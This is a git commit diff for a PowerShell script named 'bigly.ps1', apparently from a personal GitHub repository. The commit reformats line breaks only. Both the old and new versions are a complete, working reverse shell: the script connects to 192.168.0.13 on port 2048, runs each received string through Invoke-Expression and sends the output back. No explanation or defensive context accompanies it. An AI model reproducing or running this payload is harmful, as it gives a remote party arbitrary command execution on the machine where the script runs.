2375e8735fc81e77d1e9f72672d57a5a6ffde328
logsandstuff <59518250+logsandstuff@users.noreply.github.com>
2020-02-02 19:24:43 +0000

    Update bigly.ps1

--- bigly.ps1
+++ bigly.ps1
@@ -1,8 +1,6 @@
-$sm=(New-Object Net.Sockets.
-TCPClient(192.168.0.13, 2048)).
+$sm=(New-Object Net.Sockets.TCPClient(192.168.0.13, 2048)).
 GetStream(); [byte[]]$bt=0..65535|%{0};
-while(($i=$sm.Read($bt,0,$bt.Length)) -ne
-0){; $d=(New-Object Text.ASCIIEncoding).
-GetString($bt,0,$i); $st=([text.
-encoding]::ASCII).GetBytes((iex $d 2>&1));
+while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0)
+{; $d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
+$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
 $sm.Write($st,0,$st.Length)}
